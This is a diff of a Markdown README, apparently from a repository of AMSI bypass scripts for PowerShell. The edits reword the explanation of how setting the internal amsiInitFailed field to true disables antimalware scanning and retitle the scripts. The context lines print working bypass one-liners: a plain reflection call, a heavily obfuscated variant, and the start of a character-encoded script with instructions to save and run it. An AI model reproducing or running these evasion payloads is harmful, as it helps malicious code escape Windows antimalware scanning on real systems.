@@ -37,12 +37,12 @@ The AMSI integration inside PowerShell is implemented through internal .NET clas
 
 3. **Inside this class there is an internal static field commonly referenced as**:
    - amsiInitFailed.
-This field represents whether AMSI initialization failed inside the current PowerShell process.
+This field indicates whether AMSI initialization failed inside the current PowerShell process.
 
 4. **And this script set it's value to**:
-   - $null,$true.
+   - $null,$true, SetValue($null,$true) uses $null because the field is static, not because $null itself is being assigned to the field. The actual field value being assigned is $true.
 <br><br>
-This makes the current PowerShell process behave as if AMSI initialization failed, which changes how AMSI scanning operates for that session.
+This causes the current PowerShell process to behave as though AMSI initialization failed, effectively disabling AMSI scanning for that PowerShell session.
 ---
 
 ## **How To Use**
@@ -148,13 +148,13 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-### **13. AMSI Bypass Script  [Obfuscated One Liner] (Work On Old/Unpatch Versions {Windows 24h2})**
+### **13. AMSI Bypass Script  [Obfuscated One Liner] (Work On Old windows Versions)**
 ```bash
 S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} ); Write-Output "AMSI Bypass Patch Applied Successfully!"
 ```
 
 
-### **14. AMSI Bypass Script  [copy this script  ans save it as .ps1 file and run in powershell] (Work On Old/Unpatch Versions)**
+### **14. AMSI Bypass Script  [copy this script  ans save it as .ps1 file and run in powershell] (Work On Old windows Versions)**
 ```bash
 $A=[Ref].Assembly.GetType((([char]65)+([char]109)+([char]115)+([char]105)+([char]85)+([char]116)+([char]105)+([char]108)+([char]115))
 )
